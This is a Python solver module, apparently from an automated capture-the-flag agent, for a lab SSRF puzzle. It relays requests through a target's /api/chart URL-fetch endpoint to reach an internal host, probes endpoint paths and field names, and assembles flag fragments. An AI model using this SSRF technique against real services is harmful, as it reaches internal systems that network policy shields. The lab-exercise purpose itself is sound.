"""
Puzzle 1 — Between Scylla and Charybdis (Web / SSRF, 100 pts)

Two targets. Charybdis is behind a network policy (unreachable directly). Scylla
exposes a fetch primitive: POST /api/chart {"url": "http://<charybdis>:8080/depths"}
— she fetches it herself and returns the body. She speaks only http and won't
fetch herself.

Charybdis /depths returns one third of the flag per "tide", cycling 1->2->3->1.
Three sequential lookups read fragment 1, 2, 3 in order; concatenate with no
separator.

HARD BUDGET: 12 lookups total for the whole challenge, each costs a crewman.
We spend exactly 4: 1 for Charybdis index (orient / confirm reachability via
Scylla) + 3 for /depths. Every lookup is logged so nothing is wasted blindly.

Env: HAL_TARGET_SCYLLA_IP/_PORT, HAL_TARGET_CHARYBDIS_IP/_PORT (there is no single
HAL_TARGET_IP for this challenge).
"""
from typing import List, Optional

from ._http import discover_base, find_flag, post
from ._llm import llm_extract_field

# Query-param / body-field name candidates Scylla's chart endpoint may use for
# the URL. The hint says {"url": ...}, so that's first and almost certainly right.
URL_FIELDS = ["url", "target", "uri", "link", "src", "address"]
CHART_PATHS = ["/api/chart", "/chart", "/api/fetch"]


class ScyllaSolver:
    def __init__(self, agent):
        import os
        self.agent = agent
        self.scylla_ip = os.environ.get("HAL_TARGET_SCYLLA_IP") or os.environ.get("SCYLLA_IP", "")
        self.scylla_port = os.environ.get("HAL_TARGET_SCYLLA_PORT") or "8080"
        self.charybdis_ip = (os.environ.get("HAL_TARGET_CHARYBDIS_IP")
                             or os.environ.get("CHARYBDIS_IP", ""))
        self.charybdis_port = os.environ.get("HAL_TARGET_CHARYBDIS_PORT") or "8080"
        self._lookups = 0
        self._chart_url: Optional[str] = None
        self._url_field: Optional[str] = None
        print(f"Scylla:    {self.scylla_ip}:{self.scylla_port}", flush=True)
        print(f"Charybdis: {self.charybdis_ip}:{self.charybdis_port}", flush=True)

    def _extract_body(self, resp) -> str:
        """
        Scylla returns Charybdis's response. It may be raw, or wrapped as
        {"status":N,"body":"..."} / {"content": "..."}. Return the inner text.
        """
        if resp is None:
            return ""
        text = resp.text or ""
        try:
            obj = resp.json()
            if isinstance(obj, dict):
                for k in ("body", "content", "data", "response", "result"):
                    if isinstance(obj.get(k), str):
                        return obj[k]
        except Exception:
            pass
        return text

    def _chart(self, target_url: str) -> Optional[str]:
        """
        One SSRF lookup through Scylla. Consumes one crewman from the budget.
        On first use, resolves the working chart path + url field name.
        Returns the fetched body text (unwrapped), or None on failure.
        """
        self._lookups += 1
        print(f"[lookup {self._lookups}/12] Scylla fetch -> {target_url}", flush=True)

        # Once resolved, reuse the known-good (path, field) — exactly 1 POST per
        # lookup, so the 4-lookup budget maps to 4 crewmen. Only the FIRST call
        # probes alternatives, and only when the documented path/field is rejected.
        if self._chart_url and self._url_field:
            resp = post(self._chart_url, {self._url_field: target_url})
            return self._extract_body(resp) if resp is not None else None

        # First-call resolution. The hint is explicit (POST /api/chart {"url":...}),
        # so that combo is tried first and almost always resolves in one POST.
        # Cap total probe POSTs so a wrong-guess fallback can never exhaust the
        # crewman budget (each server-reaching POST may cost a crewman).
        MAX_PROBE_POSTS = 4
        probes = 0
        paths = [f"{self.scylla_base}{p}" for p in CHART_PATHS]
        fields = URL_FIELDS
        for path in paths:
            for field in fields:
                if probes >= MAX_PROBE_POSTS:
                    print("Scylla probe cap reached — stopping to preserve budget.", flush=True)
                    return None
                resp = post(path, {field: target_url})
                probes += 1
                if resp is None:
                    continue
                # 404/405 => wrong path (try next path); 422 => wrong field (next field).
                if resp.status_code in (404, 405):
                    break
                if resp.status_code == 422:
                    continue
                self._chart_url = path
                self._url_field = field
                print(f"Scylla chart resolved: POST {path} field={field!r}", flush=True)
                return self._extract_body(resp)
        return None

    def solve(self) -> bool:
        print("=== Scylla & Charybdis Solver (SSRF, 12-lookup budget) ===", flush=True)
        if not self.scylla_ip or not self.charybdis_ip:
            print("Missing Scylla or Charybdis IP", flush=True)
            return False

        self.scylla_base = discover_base(self.scylla_ip, self.scylla_port)
        if not self.scylla_base:
            print("Scylla unreachable", flush=True)
            return False

        chary = f"http://{self.charybdis_ip}:{self.charybdis_port}"

        # Budget line item 1: Charybdis index via Scylla — confirms the SSRF path
        # works and the field/path are resolved before we spend depths lookups.
        idx_body = self._chart(f"{chary}/")
        if idx_body is None:
            print("Scylla did not fetch Charybdis index — SSRF path unresolved.", flush=True)
            # Don't give up: the index probe may 404 on Charybdis while /depths works.
        else:
            flag = find_flag(idx_body)
            if flag:
                return self.agent.submit_flag(flag, self.agent.challenge_id)

        # Budget line items 2-4: three tides of /depths, read in order.
        fragments: List[str] = []
        for tide in range(3):
            body = self._chart(f"{chary}/depths")
            if body is None:
                print(f"Tide {tide + 1}: no body returned", flush=True)
                continue
            frag = self._parse_fragment(body)
            print(f"Tide {tide + 1} fragment: {frag!r}", flush=True)
            fragments.append(frag)
            # Early win if a full flag ever appears in one tide fragment.
            whole = find_flag(frag)
            if whole:
                return self.agent.submit_flag(whole, self.agent.challenge_id)

        candidate = "".join(fragments)
        print(f"Concatenated: {candidate!r}", flush=True)
        flag = find_flag(candidate) or (candidate if candidate.startswith("HALCTF{") else None)
        if not flag:
            print("Concatenation did not form a flag. Fragments above; "
                  f"{12 - self._lookups} lookups remain for a tuned retry.", flush=True)
            # If it looks like the flag body without a clean regex match, submit as-is.
            if candidate.strip():
                flag = candidate.strip()
            else:
                return False
        return self.agent.submit_flag(flag, self.agent.challenge_id)

    @staticmethod
    def _parse_fragment(body: str) -> str:
        """
        Extract the flag fragment from a /depths response. It may be raw text or
        JSON like {"fragment": "..."} / {"tide": 1, "spew": "HALCTF{..."}. Prefer a
        recognizable field; else return the trimmed body.
        """
        import json
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                # Try known field names first (fast path)
                for k in ("spew", "fragment", "part", "piece", "chunk", "data", "depths", "value"):
                    if isinstance(obj.get(k), str):
                        return obj[k]

                # LLM fallback: ask it to find the fragment field
                print(f"[LLM] deterministic field names failed, asking LLM...", flush=True)
                result = llm_extract_field(
                    "Find the field containing the flag fragment (partial HALCTF{{...}} string or tide data)",
                    obj
                )
                if result:
                    print(f"[LLM] extracted: {result!r}", flush=True)
                    return result
        except Exception:
            pass
        return body.strip()
